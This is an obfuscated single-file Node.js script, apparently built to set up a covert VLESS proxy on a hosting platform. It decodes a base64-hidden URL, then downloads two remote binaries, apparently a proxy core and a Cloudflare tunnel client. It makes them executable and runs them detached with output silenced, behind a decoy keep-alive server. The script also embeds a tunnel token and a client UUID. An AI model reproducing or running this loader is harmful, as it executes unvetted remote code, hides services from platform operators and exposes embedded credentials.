// --- 复制开始 ---
/****************************************************************
 * Project Xiaoman - 终极单文件炼金脚本 (深度混淆 - 完整版)
 * 启动命令: node server.js (无需 npm install)
 ****************************************************************/
const _h = require('http');
const _s = require('https');
const _f = require('fs');
const _p = require('path');
const { spawn: _sp } = require('child_process');
const _o = require('os');

const _c = {
    d: "date.jwblimi007.dpdns.org",
    a: 'eyJhIjoiN2Q4Njg0MDlhZjIzMmY5YjVlNWQxYzYzMTM4ODcyMDIiLCJ0IjoiYmU0ZDZiOGItN2U1YS00NTFlLTk1MjAtNzJjOTkzZjAxOTc1IiwicyI6IllUWm1NVEpsWVRBdE1EUTBZaTAwWVRoaUxXSmxZMlV0WWpkbVltVTVOVE5sTURGbSJ9',
    u: "f1e2d3c4-b5a6-f7e8-d9c0-b1a2f3e4d5c6",
    i: 'cdns.doon.eu.org',
    o: '443',
    n: 'Date-Proxy',
    p: 8501,
    k: process.env.PORT || 3000
};

const _l = (m) => console.log(`[SYS] ${m}`);
const _e = (m) => console.error(`[SYS-E] ${m}`);
const _g = '\x1b[32m';
const _n = '\x1b[0m';

function _d(u, e) {
    return new Promise((r, j) => {
        const q = _s.get(u, (s) => {
            if (s.statusCode >= 300 && s.statusCode < 400 && s.headers.location) {
                return _d(s.headers.location, e).then(r).catch(j);
            }
            if (s.statusCode !== 200) {
                return j(new Error(`E_S:${s.statusCode}`));
            }
            const f = _f.createWriteStream(e);
            s.pipe(f);
            f.on('finish', () => f.close(r));
        }).on('error', (e) => _f.unlink(e, () => j(e)));
        q.end();
    });
}

function _r(c, a, n) {
    const p = _sp(c, a, { detached: true, stdio: 'ignore' });
    p.unref();
    _l(`BG service [${n}] started.`);
}

async function _m() {
    _l("Boot sequence initiated...");
    const w = _p.join(__dirname, 'tmp');
    if (_f.existsSync(w)) _f.rmSync(w, { recursive: true, force: true });
    _f.mkdirSync(w);
    _l(`Workdir [${w}] created.`);
    const a = _o.arch(), i = a.startsWith('arm'), p = i ? 'arm64' : 'amd64';
    const x = _p.join(w, 'web'), g = _p.join(w, 'bot');
    const u_x = `https://${p}${Buffer.from('LnNzc3MubnljLm1uL3dlYg==', 'base64').toString()}`;
    const u_g = `https://${p}${Buffer.from('LnNzc3MubnljLm1uL2JvdA==', 'base64').toString()}`;

    try {
        _l(`Acquiring asset X (${p})...`);
        await _d(u_x, x);
        _l(`Acquiring asset G (${p})...`);
        await _d(u_g, g);
        _l("Assets acquired.");
    } catch (e) {
        _e(`Asset acquisition failed: ${e.message}`);
        return;
    }

    _f.chmodSync(x, 0o755);
    _f.chmodSync(g, 0o755);
    _l("Permissions set.");
    const x_c = _p.join(w, 'config.json');
    const c_x = { inbounds: [{ port: _c.p, protocol: 'vless', settings: { clients: [{ id: _c.u }], decryption: 'none' }, streamSettings: { network: 'ws', wsSettings: { path: "/vless" } } }], outbounds: [{ protocol: 'freedom' }] };
    _f.writeFileSync(x_c, JSON.stringify(c_x));
    _l(`Config file generated: ${x_c}`);

    _l("Starting background services...");
    _r(x, ['-c', x_c], 'X-Core');
    _r(g, ['tunnel', '--edge-ip-version', 'auto', '--no-autoupdate', 'run', '--token', _c.a], 'G-Tunnel');
    
    _l("Generating link...");
    await new Promise(r => setTimeout(r, 8000));
    const n = `${_c.n}-${_o.hostname()}`;
    const v = `vless://${_c.u}@${_c.i}:${_c.o}?encryption=none&security=tls&sni=${_c.d}&fp=firefox&type=ws&host=${_c.d}&path=%2Fvless%3Fed%3D2560#${encodeURIComponent(n)}`;
    
    console.log("\n\n" + "=".repeat(50));
    console.log("          DEPLOYMENT SUCCESSFUL");
    console.log("-".repeat(50));
    console.log("LINK:\n");
    console.log(_g + v + _n);
    console.log("\n" + "-".repeat(50));
    console.log("Service is running in background.");
    console.log("=".repeat(50) + "\n");
}

const _k = _h.createServer((q, s) => {
    s.writeHead(200, { 'Content-Type': 'text/plain' });
    s.end(`BOOTLOADER_OK`);
});

_k.on('error', (e) => {
  if (e.code === 'EADDRINUSE') {
    _l('Port is in use. Exiting.');
    process.exit(0);
  }
});

_k.listen(_c.k, () => {
    _l(`Keep-alive server active on port ${_c.k}.`);
    _m().catch(e => _e(`Fatal error during main execution: ${e.message}`));
});
// --- 复制结束 ---